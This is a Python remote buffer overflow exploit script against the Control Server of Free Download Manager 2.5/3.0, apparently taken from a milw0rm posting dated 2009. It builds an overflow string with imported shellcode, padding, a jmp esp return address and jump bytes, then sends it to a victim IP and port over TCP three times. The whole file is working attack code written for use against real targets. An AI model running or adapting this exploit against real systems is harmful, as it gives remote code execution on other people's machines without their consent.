#!/usr/bin/python
#[*] Usage   : fdm.py [victime_ip]
#[*] Bug     : Free Download Manager 2.5/3.0 (Control Server) Remote BOF Exploit
#[*] Fix     : update
#[*] Founder : Praveen Darshanam   
#[*] Tested on :    Xp sp3 (en)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)

import socket,sys,time,os
from payload import buf
import socket
from struct import pack
import struct
import os
def shell_attack(target_machine, target_port):

	

	host = target_machine 
	port = target_port

	# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
	

	exploit = b"3-1 "# a trick & a memory ;)
	exploit += buf
	exploit += b"\x41"*(1003-len(buf))
	exploit += b"\xE8\x10\xFC\xFF\xFF"
	exploit += b"\x93\xB1\x40\x00" #jmp esp fdmwi
	exploit += b"\x90"*4
	exploit += b"\x73\xF1\x42\x42"

	





	i=0
	#3a9liya MIAS xD
	while i<=2:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		s.send(exploit)
		i=i+1

	# milw0rm.com [2009-06-09]